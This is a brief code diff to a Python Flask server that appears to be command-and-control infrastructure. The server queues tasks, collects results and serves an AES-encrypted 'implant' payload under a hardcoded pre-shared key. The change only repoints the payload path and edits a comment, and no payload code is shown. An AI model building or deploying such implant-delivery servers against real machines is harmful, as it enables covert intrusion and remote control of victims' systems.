@@ -17,6 +17,7 @@ from cryptography.hazmat.primitives import serialization
 app = Flask(__name__)
 HOST = ""  # put your local ip here
 PORT = 8443
+PAYLOAD_PATH = "dist/dist/implant"
 tasks = []
 results = []
 UPLOAD_FOLDER = "uploads"
@@ -119,7 +120,7 @@ def send_encrypted_payload():
     """
     # encrypt payload before sending if it doesnt exist
     if not os.path.exists("dist/encrypted_payload"):
-        with open("dist/payload", "rb") as f:
+        with open(PAYLOAD_PATH, "rb") as f:
             plain = f.read()
 
             pre_shared_key = b"Kg.\xe1\xfb\x8e\xf6\x81\xa2\xf0g\xd6\xfd\x00\x047\xd0m\xe3\xe7E@\x00\xb4=\xc7\xb4\xc4-\x87\x0c\x17"
@@ -130,7 +131,7 @@ def send_encrypted_payload():
             encrypted_payload = nonce + ciphertext + tag
             return encrypted_payload
 
-    # else send encrypted payload
+    # else send existing encrypted payload
     with open("dist/encrypted_payload", "rb") as f:
         payload = f.read()
         return payload
